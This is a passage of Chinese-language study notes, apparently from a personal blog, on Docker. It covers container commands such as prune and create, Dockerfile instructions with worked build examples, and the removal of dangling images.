https://docs.docker.com/go/formatting/</span><br><span class="line">                        for more information about formatting output with</span><br><span class="line">                        templates</span><br><span class="line">      --since string    Show all events created since timestamp</span><br><span class="line">      --until string    Stream events until this timestamp</span><br><span class="line">      docker system events</span><br><span class="line">2024-03-15T15:36:48.294313459+08:00 container create 5933b54ec9d2b725ff3b3350804c6ea2919272829651e45097d46ac5826806ee (image=tomcat:8.5.49, name=tom2)</span><br></pre></td></tr></table></figure><p>有点像日志监视器，有容器启停之类 的信息它会输出在这里</p><h3 id="docker-system-info"><a href="#docker-system-info" class="headerlink" title="docker system info"></a>docker system info</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker system info</span></span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:    25.0.3</span><br><span class="line"> Context:    default</span><br><span class="line"> Debug Mode: <span class="literal">false</span></span><br><span class="line"> Plugins:</span><br><span class="line">  buildx: Docker Buildx (Docker Inc.)</span><br><span class="line">    Version:  v0.12.1</span><br><span class="line">...</span><br><span class="line">docker info也行</span><br></pre></td></tr></table></figure><h3 id="docker-system-prune-重点"><a href="#docker-system-prune-重点" class="headerlink" title="docker system prune(重点)"></a>docker system prune(重点)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker system prune --help</span><br><span class="line"></span><br><span class="line">Usage:  docker system prune [OPTIONS]</span><br><span class="line"></span><br><span class="line">Remove unused data</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Remove all unused images not just dangling ones 一出所有没在使用的镜像</span><br><span class="line">      --filter filter   Provide filter values (e.g. &quot;label=&lt;key&gt;=&lt;value&gt;&quot;)</span><br><span class="line">  -f, --force           Do not prompt for confirmation</span><br><span class="line">      --volumes         Prune anonymous volumes</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED         STATUS                     PORTS                                       NAMES</span><br><span class="line">5933b54ec9d2   tomcat:8.5.49   &quot;/bin/bash&quot;         5 minutes ago   Exited (0) 5 minutes ago                                               tom2</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   12 days ago     Up 11 minutes              0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker system prune</span><br><span class="line">WARNING! This will remove:</span><br><span class="line">  - all stopped containers</span><br><span class="line">  - all networks not used by at least one container</span><br><span class="line">  - all dangling images</span><br><span class="line">  - unused build cache</span><br><span class="line"></span><br><span class="line">Are you sure you want to continue? [y/N] y</span><br><span class="line">Deleted Containers:</span><br><span class="line">5933b54ec9d2b725ff3b3350804c6ea2919272829651e45097d46ac5826806ee</span><br><span class="line"></span><br><span class="line">Total reclaimed space: 5B</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS          PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   12 days ago   Up 11 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="docker-create"><a href="#docker-create" class="headerlink" title="docker create"></a>docker create</h2><p>和docker run基本上差不多，但没有-d选项。-d是后台，因为create创建但不运行，默认都是后台的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker create --name tom1 -p 8081:8080 tomcat:8.5.49</span><br><span class="line">6264b6fbe42c8866557c617c52f31894f72ff9920f807e8029e734382e30f67b</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED         STATUS    PORTS     NAMES</span><br><span class="line">6264b6fbe42c   tomcat:8.5.49   &quot;catalina.sh run&quot;   3 seconds ago   Created             tom1</span><br></pre></td></tr></table></figure><p>docker create 命令仅用于创建一个容器，并不会启动容器。该命令没有-d选项,因为 docker create 命令创建的容器默认都是以后台方式来运行的(必须要通过 dockerstart [容器]来启动),除非创建时指定-it</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="容器基础"><a href="#容器基础" class="headerlink" title="容器基础"></a>容器基础</h3><p>​深刻理解，容器存在的意义就是为其中的应用提供运行环境:容器运行的意义就是为了运行买中的应用，让应用对外提供服务。所以启动容器的目的就是为了启动并运行容器中的应用。所以容器中的应用运行完毕后，容器就会自动终止。</p><h3 id="创建启动"><a href="#创建启动" class="headerlink" title="创建启动"></a>创建启动</h3><p>​理解 docker run 命令用于创建并启动容器，同时其会运行容器中指定的应用。这个指定的应用要么通过 docker run 中的[command]指定，要么通过容器镜像的 Dockerfile 中的 CMD指令指定。。</p><p>​掌握容器的两种启动模式:交互模式-it，分离模式-d。。</p><h3 id="容器退出命令-1"><a href="#容器退出命令-1" class="headerlink" title="容器退出命令"></a>容器退出命令</h3><p>exit:退出并终止当前容器</p><p>ctrl+p+q:退出但不终止当前容器</p><h3 id="容器状态查看命令"><a href="#容器状态查看命令" class="headerlink" title="容器状态查看命令"></a>容器状态查看命令</h3><p>docker ps命令中-a、-q、-l、-n选项</p><h3 id="容器再进命令"><a href="#容器再进命令" class="headerlink" title="容器再进命令"></a>容器再进命令</h3><p>​理解 docker exec 与 docker attach 的区别与联系:</p><p>docker exec:会新建一个进程来访问容器，一般与-it选项联用，exit命令退出</p><p>docker attach:不会新建进程，而是将标准输入和标准输出直接附着在容器进程之上（使用户可以通过键盘来操作容器，使容器的输出可以通过显示器展示给用户），一般不使用选项，但退出时需要考虑exit还是c+q+q</p><h3 id="容器内进程查看命令"><a href="#容器内进程查看命令" class="headerlink" title="容器内进程查看命令"></a>容器内进程查看命令</h3><p>docker top命令后可携带ps命令的选项</p><h3 id="容器日志查看命令"><a href="#容器日志查看命令" class="headerlink" title="容器日志查看命令"></a>容器日志查看命令</h3><p>docker logs查看的是容器中应用的运行日志，这个应用是根据容器创建时命令(docker run 或 docker create)中的[cmd]指定，要么通过容器镜像的 Dockerfile 中的 CMD 指令指定。。</p><h3 id="容器启停命令"><a href="#容器启停命令" class="headerlink" title="容器启停命令"></a>容器启停命令</h3><ul><li>​理解以下几点:”容器启动命令启动的是容器本身，但容器在启动的同时会启动一个应用，而这个应用是根据容器创建时命令(docker run 或 docker create)中的[command]指定，或通过容器镜像的Dockerfile 中的 CMD 指令指定。”</li><li>​容器停止命令停止的是容器本身,但在容器停止之前会先停止容器中的所有进程的运行，也就停止了对外提供服务的应用进程。</li><li>​暂停命令仅暂停的是容器对外提供服务,容器本身并没有停止运行,所以容器中的应用也就没有停止运行，只不过其不能通过容器再对外提供服务了。</li><li>暂停&#x2F;解除暂停两个命令对 tomcat 容器中的 tomcat 进程的运行没有任何影响，这两个命令的运行并不会记录到 tomcat 的启停日志中。</li></ul><h3 id="容器删除和镜像删除"><a href="#容器删除和镜像删除" class="headerlink" title="容器删除和镜像删除"></a>容器删除和镜像删除</h3><p>​能够区分容器删除与镜像删除命令:容器删除是dockerrm，镜像删除是 docker rmi。它们都有一个选项-f，表示强制删除。镜像的强制删除，其不会强制删除 UP 状态的容器的镜像。</p><h3 id="容器与宿主机传递文件"><a href="#容器与宿主机传递文件" class="headerlink" title="容器与宿主机传递文件"></a>容器与宿主机传递文件</h3><ol><li>深刻理解容器本身就是一个文件系统</li><li>理解 docker cp命令就是用于完成从一个文件系统复制到另一个文件系统而己，与容器是否运行无关。</li><li>了解 docker cp命令不支持容器间文件的复制。</li></ol><h3 id="提交容器为镜像"><a href="#提交容器为镜像" class="headerlink" title="提交容器为镜像"></a>提交容器为镜像</h3><p>了解 docker commit 生成的镜像中是包含原镜像的所有分层历史记录的。</p><h3 id="导入-x2F-导出容器"><a href="#导入-x2F-导出容器" class="headerlink" title="导入&#x2F;导出容器"></a>导入&#x2F;导出容器</h3><ol><li>理解导入&#x2F;导出容器与导入&#x2F;导出镜像命令的区别与联系。</li><li>理解导入&#x2F;导出容器与 docker commit 的区别与联系。</li><li>理解 docker export 是对镜像分层合并后视图的文件系统快照的导出，仅包含合并后的一层镜像信息，不包含原镜像的分层历史记录。</li></ol><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><h3 id="Dockerfile-简介"><a href="#Dockerfile-简介" class="headerlink" title="Dockerfile 简介"></a>Dockerfile 简介</h3><p>Dockerfile 是用于构建 Docker 镜像的脚本文件，由一系列指令构成。通过 docker build命令构建镜像时，Dockerfile 中的指令会<strong>由上到下</strong>依次执行，每条指令都将会构建出一个镜像。这就是镜像的分层。因此，指令越多，层次就越多，创建的镜像就越多，效率就越低所以在定义 Dockerfile 时，能在一个指令完成的动作就不要分为两条。。</p><h3 id="指令简介"><a href="#指令简介" class="headerlink" title="指令简介"></a>指令简介</h3><p>对于 Dockerfile 的指令，需要注意以下几点:</p><ol><li>指令是大小不敏感的，但惯例是写为全大写</li><li>指令后至少会携带一个参数。</li><li>#号开头的行为注释。。</li></ol><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>【语法】FROM <image>[:<tag>].</p><p>【解析】用于指定基础镜像，且必须是<strong>第一条</strong>指令;若省略了tag，则默认为latest。</p><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>【语法】MAINTAINER <name>.</p><p>【解析】MAINTAINER 指令的参数填写的一般是维护者姓名和信箱。不过，该指令官方已不建议使用，而是使用 LABEL指令代替。</p><h3 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h3><p>【语法】LABEL<key>&#x3D;<value> <key>&#x3D;<value></p><p>【解析】LABEL 指令中可以以键值对的方式包含任意镜像的元数据信息，用于替代MAINTAINER 指令。通过 docker inspect 可査看到 LABEL与 MAINTAINER 的内容。</p><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>【语法 1】ENV <key><value>.</p><p>【解析】用于指定环境变量，这些环境变量，后续可以被 RUN 指令使用，容器运行起来之后，也可以在容器中获取这些环境变量。。</p><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>【语法1】ADD<src> <dest></p><p>【语法 2】ADD[“<src>“,”<dest>“] #路径中存在空格时使用双引号引起来。</p><p>【解析】该指令将复制当前宿主机中指定文件 src到容器中的指定目录 dest 中。src 可以是宿主机中的绝对路径，也可以时相对路径。但相对路径是相对于dockerbuild 命令所指定的路径的。src指定的文件可以是一个压缩文件，压缩文件复制到容器后会自动解压为目录:src也可以是一个 URL，此时的 ADD指令相当于 wget 命令;src最好不要是目录，其会将该目录中所有内容复制到容器的指定目录中。dest 是一个绝对路径,其最后面的路径必须要加上斜杠，否则系统会将最后的目录名称当做是文件名的。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> zookeeper.tar.gz /opt/add/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> zookeeper.tar.gz /opt/copy/</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408193507130.png" alt="image-20240408193507130"></p><p>可以发现add的是解压后的，而copy是没解压的</p><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>【说明】功能与 ADD指令相同，只不过src不能是 URL。若 src为压缩文件，复制到容器后不会自动解压。”</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> zookeeper.tar.gz /opt/add</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> zookeeper.tar.gz /opt/copy</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408193751454.png" alt="image-20240408193751454"></p><p>没有尾巴的斜杠后，<strong>copy变成了重命名</strong>，而add则是正常的，如果是改前面的压缩包的路径，在构建镜像时需要注意相对路径，所以我们在构建镜像时最好把需要的文件</p><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>【语法】WORKDIR path.</p><p>【解析】容器打开后默认进入的目录，一般在后续的 RUN、CMD、ENTRYPOINT、ADD 等指令中会引用该目录。可以设置多个WORKDIR指令。后续 WORKDIR 指令若用的是相对路径，则会基于之前 WORKDIR 指令指定的路径。在使用 docker run 运行容器时，可以通过-w 参数覆盖构建时所设置的工作目录。</p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>【语法 1】RUN <command></p><p>【解析】这里的<command>就是 shell 命令。docker build 执行过程中，会使用 shell 运行指定的command.</p><p>【语法 2】RUN [“EXECUTABLE”,”PARAM1”,”PARAM2”,…].【解析】在 docker build 执行过程中,会调用第一个参数”EXECUTABLE”指定的应用程序运行,并使用后面第二、三等参数作为应用程序的运行参数。</p><h3 id="CMD（重要）"><a href="#CMD（重要）" class="headerlink" title="CMD（重要）"></a>CMD（重要）</h3><p>【语法 1】CMD [“EXECUTABLE”,”PARAM1”,”PARAM2”,..].</p><p>【解析】在容器启动后，即在执行完 docker run后会立即调用执行”EXECUTABLE”指定的可执行文件，并使用后面第二、三等参数作为应用程序的运行参数。”</p><p>【语法2】CMD command param1 param2, ….</p><p>【解析】这里的 command 就是 shel 命令。在容器启动后会立即运行指定的 shell 命令。。</p><p>【语法 3】CMD [“PARAM1”,”PARAM2”,…].【解析】提供给 ENTERYPOINT 的默认参数。”</p><h3 id="ARGS"><a href="#ARGS" class="headerlink" title="ARGS"></a><strong>ARGS</strong></h3><p><img src="/../image/image-20240408201240156.png" alt="image-20240408201240156"></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ARG</span> name=TOM</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="variable">$name</span></span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408201343187.png" alt="image-20240408201343187"></p><p>要注意的是，build-arg是要定义过的变量，改都不行，一定要定义过arg才行</p><h3 id="注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile"><a href="#注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile" class="headerlink" title="注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile"></a>注意：制作镜像时，如果有多个dockerfile，需要用-f参数标记使用哪个dockerfile</h3><p>例子：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;cal&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>docker built -t  mycal:2.0 .&#x2F;docker build -f Dockerfile -t mycal:2.0 .</p><p>执行，可以覆盖，比如在docker run mycal:2.0后面加上date结果就会出现变化，但参数也不能传递，如-y</p><p><img src="/../image/image-20240408164303105.png" alt="image-20240408164303105"></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cal&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>我要执行的命令是来自命令行，这两个执行的区别是&#x2F;bin&#x2F;bash才是你要执行的东西，cal成为了参数，前者是直接执行cal,测试一下把</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile3 -t mycal:3.0 .</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408165326037.png" alt="image-20240408165326037"></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;hello,world!&quot;</span>]</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;echo&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408170845565.png" alt="image-20240408170845565"></p><p>可以看但cmd作为entrypoint的参数执行了</p><h3 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT."></a>ENTRYPOINT.</h3><p>【语法 1】ENTRYPOINT [“EXEGUTABLE”,”PARAM1”,”PARAM2”,…]</p><p>【解析】在容器启动过程中，即在执行 docker run 时，会调用执行”EXECUTABLE”指定的应用程序，并使用后面第二、三等参数作为应用程序的运行参数。(CMD和它都有的话，执行这个)</p><p>【语法2】ENTRYPOlNT command param1 param2,…</p><p>【解析】这里的 command 就是 shel 命令。在容器启动过程中，即在执行 docker run 时，会运行指定的 shell 命令。</p><p>例子：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> cal</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408165939812.png" alt="image-20240408165939812"></p><p><img src="/../image/image-20240408170029994.png" alt="image-20240408170029994"></p><p>-y有输出但和date一样不识别</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;cal&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408170218134.png" alt="image-20240408170218134"></p><p><img src="/../image/image-20240408170302307.png" alt="image-20240408170302307"></p><p>-y是行的，但date会报错了</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cal&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408170435245.png" alt="image-20240408170435245"></p><p>又和第一个一样了。</p><p>Dockerfile中的[command]或[“EXECUTABLE”]如果是通过CMD指定的，则该镜像的启动命令dockerrun中是不能添加参数[ARG]的。因为Dockerfile中的CMD是可以被命令中的[COMMAND]替代的。如果命令中的IMAGE后仍有内容，此时对于docker daemon 来说，其首先认为是替代用的[COMMAND]，如果有两个或两个以上的内容，后面的内容才会认为是[ARG]。所以，添加的-y会报错，因为没有-y这样的[COMMAND]。3</p><p>Dockerfile中的[command]或[“EXECUTABLE”]如果是通过CMQ指定的，则该镜像的启动命令dockerrun中是不能添加参数[ARG]的。因为Dockerfile中的CMD是可以被命令中的[COMMAND]替代的。如果命令中的IMAGE后仍有内容，此时对于dockerdaemon来说，其首先认为是替代用[COMMAND]，如果有两个或两个以上的内容，后面的内容才会认为是[ARG]。所以，添加的-y会报错，因为没有-y这样的[COMMAND]。</p><p>不过，docker daemon 对于 ENTRYPOINT 指定的[command]与[“EXECUTABLE”]的处理方式是不同的。如果是[command]指定的 shell，daemon 会直接运行，而不会与docker run 中的[ARG]进行拼接后运行:如果是[“EXECUTABLE”]指定的命令，daemon则会先与 docker run 中的[ARG]进行拼接，然后再运行拼接后的结果。</p><p>结论:无论是CMD还是ENTRYPOINT，使用[“EXECUTABLE”]方式的通用性会更强些。</p><h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>【语法】ONBUILD [INSTRUCTION]<br>【解析】该指令用于指定当前镜像的子镜像进行构建时要执行的指令。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENV</span> WORKPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$WORKPATH</span></span></span><br><span class="line"><span class="keyword">ONBUILD</span> <span class="keyword">RUN</span><span class="language-bash"> yum install -y wget</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br></pre></td></tr></table></figure><p>Dockerfile2</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> parent:<span class="number">1.0</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240408202024812.png" alt="image-20240408202024812"></p><p><img src="/../image/image-20240408202014168.png" alt="image-20240408202014168"></p><p><img src="/../image/image-20240408202200083.png" alt="image-20240408202200083"></p><p><img src="/../image/image-20240408202217208.png" alt="image-20240408202217208"></p><h3 id="自己的hello-world镜像"><a href="#自己的hello-world镜像" class="headerlink" title="自己的hello world镜像"></a>自己的hello world镜像</h3><h4 id="scratch镜像"><a href="#scratch镜像" class="headerlink" title="scratch镜像"></a>scratch镜像</h4><p>​在构建自己的镜像之前，首先要了解一个特殊的镜像 scratch。scratch 镜像是一个空镜像，是所有镜像的 Baselmage(相当于面向对象编程中的 Object类)。scratch 镜像<strong>只能在 Dockerfile 中被继承</strong>,不能通过 pul 命令拉取,不能 run,也没有 tag。并且它也不会生成镜像中的文件系统层。在 Docker 中，scratch 是一个保留字，用户不能作为自己的镜像名称使用。。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir hw</span><br><span class="line">[root@localhost ~]# cd hw</span><br><span class="line">[root@localhost hw]# ls</span><br><span class="line">[root@localhost hw]# vim hello.c</span><br><span class="line">[root@localhost hw]# gcc --static -o hello hello.c</span><br><span class="line">[root@localhost hw]# ls</span><br><span class="line">hello  hello.c</span><br><span class="line">[root@localhost hw]# ./hello</span><br><span class="line">hello my docker world!</span><br><span class="line">[root@localhost hw]# docker build -t hello-my-world .</span><br><span class="line">[+] Building 0.1s (5/5) FINISHED                                 docker:default</span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                       0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 137B                                       0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                            0.0s</span><br><span class="line"> =&gt; [internal] load build context                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 865.65kB                                      0.0s</span><br><span class="line"> =&gt; [1/1] ADD hello /                                                      0.0s</span><br><span class="line"> =&gt; exporting to image                                                     0.0s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                    0.0s</span><br><span class="line"> =&gt; =&gt; writing image sha256:74852c0574d8c68375d7bb15fcddbc9b3e106863435bd  0.0s</span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/hello-my-world  </span><br><span class="line"> [root@localhost hw]# docker images</span><br><span class="line">REPOSITORY       TAG         IMAGE ID       CREATED              SIZE</span><br><span class="line">hello-my-world   latest      74852c0574d8   About a minute ago   865kB</span><br><span class="line">。。。</span><br><span class="line">[root@localhost hw]# docker run hello-my-world</span><br><span class="line">hello my docker world!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="自己的centos镜像"><a href="#自己的centos镜像" class="headerlink" title="自己的centos镜像"></a>自己的centos镜像</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> youzipii youzipii@<span class="number">123</span>.com</span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> version=<span class="string">&quot;1.0&quot;</span> description=<span class="string">&quot;this is a centos 7 image&quot;</span> email=<span class="string">&quot;TOM@123.com&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span>  WORKPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$WORKPATH</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y wget vim net-tools</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br></pre></td></tr></table></figure><h4 id="ERROR-failed-to-solve-process-“-x2F-bin-x2F-sh-c-yum-install-y-wget-vim-net-tools”-did-not-complete-successfully-exit-code-1"><a href="#ERROR-failed-to-solve-process-“-x2F-bin-x2F-sh-c-yum-install-y-wget-vim-net-tools”-did-not-complete-successfully-exit-code-1" class="headerlink" title="ERROR: failed to solve: process “&#x2F;bin&#x2F;sh -c yum install -y wget vim net-tools” did not complete successfully: exit code: 1"></a>ERROR: failed to solve: process “&#x2F;bin&#x2F;sh -c yum install -y wget vim net-tools” did not complete successfully: exit code: 1</h4><p>重启好像就可以，但生产环境，慎用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost cts]<span class="comment"># docker build -t youzipii:1.0 .</span></span><br><span class="line">[+] Building 49.0s (7/7) FINISHED                                docker:default</span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                       0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 326B                                       0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/centos:7                0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                            0.0s</span><br><span class="line"> =&gt; [1/3] FROM docker.io/library/centos:7                                  0.0s</span><br><span class="line"> =&gt; CACHED [2/3] WORKDIR /usr/local                                        0.0s</span><br><span class="line"> =&gt; [3/3] RUN yum install -y wget vim net-tools                           47.3s</span><br><span class="line"> =&gt; exporting to image                                                     1.6s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                    1.6s</span><br><span class="line"> =&gt; =&gt; writing image sha256:3f62d30f08ddde26d1729b2706c8a7ae9f4e4bbc9171a  0.0s</span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/youzipii:1.0         </span><br><span class="line">[root@localhost cts]<span class="comment"># docker run --name ct2 -it youzipii:1.0</span></span><br><span class="line">[root@81ed05ea8530 <span class="built_in">local</span>]<span class="comment"># pwd</span></span><br><span class="line">/usr/local</span><br><span class="line">[root@81ed05ea8530 <span class="built_in">local</span>]<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line"><span class="comment">#其它信息可以通过</span></span><br><span class="line">docker inspect xx</span><br><span class="line"><span class="comment">#分层信息,FROM不算</span></span><br><span class="line">[root@localhost cts]<span class="comment"># docker history youzipii:1.0</span></span><br><span class="line">IMAGE          CREATED          CREATED BY                                      SIZE      COMMENT</span><br><span class="line">3f62d30f08dd   6 minutes ago    CMD [<span class="string">&quot;/bin/sh&quot;</span> <span class="string">&quot;-c&quot;</span> <span class="string">&quot;/bin/bash&quot;</span>]                0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      6 minutes ago    RUN /bin/sh -c yum install -y wget vim net-t…   297MB     buildkit.dockerfile.v0</span><br><span class="line">.....</span><br><span class="line">[root@localhost ~]<span class="comment"># docker run -w /root -it centos7:net-tools</span></span><br><span class="line">[root@6aaf937d3252 ~]<span class="comment"># pwd</span></span><br><span class="line">/root</span><br><span class="line">[root@6aaf937d3252 ~]<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker run --name ct2  -it centos7:net-tools</span></span><br><span class="line">[root@49b72fcb1f16 /]<span class="comment"># pwd</span></span><br><span class="line">/</span><br><span class="line"><span class="comment">#可以看到-w可以指定工作目录，不指定则是默认的workdir</span></span><br></pre></td></tr></table></figure><p>如果build相同的镜像，后面的会被看作悬虚镜像</p><h3 id="可以构建出新的镜像的方式有"><a href="#可以构建出新的镜像的方式有" class="headerlink" title="可以构建出新的镜像的方式有:"></a>可以构建出新的镜像的方式有:</h3><ol><li>docker build.</li><li>docker commit.</li><li>docker import(注意，docker load并没有构建出新的镜像，其与原镜像是同一个镜像).</li><li>docker compose.</li><li>docker hub中完成Automated Builds.</li></ol><h2 id="悬虚镜像"><a href="#悬虚镜像" class="headerlink" title="悬虚镜像"></a>悬虚镜像</h2><p>悬虚镜像是指既没有 Repository 又没有 Tag的镜像。当新建了一个镜像后，为该镜像指定了一个已经存在的 TAG，那么原来的镜像就会变为悬空镜像。</p><p>为了演示悬虚镜像的生成过程，这里先修改前面定义的 Dockerfile，然后再生成镜像，且生成的新的镜像与前面构建的镜像的名称与 Tag 均相同。</p><p>删除悬虚镜像：</p><p>悬虚镜像是一种“无用”镜像，其存在只能是浪费存储空间，所以一般都是要删除的对于悬虚镜像的删除，除了可以通过 docker</p><p>rmi<imagelD> 进行删除外，还有专门的删除命令 docker image prune。该命令能够一次性删除本地全部的悬空镜像。不过有个前提，就是这些悬虚镜像不能是已经启动了容器的，无论容器是否是退出状态。当然，如果再加上-a选项，则会同时再将没有被任何容器使用的镜像也删除。。</p><p>另外，还有一个命令 docker system prune 也可以删除悬虚镜像。只不过，其不仅删除的是悬虚镜像，还有其它系统“无用”内容。。<br>在删除这个悬虚镜像之前,首先查看其是否启动了容器。如果启动了,则先将容器删除。”</p><figure class="highlight 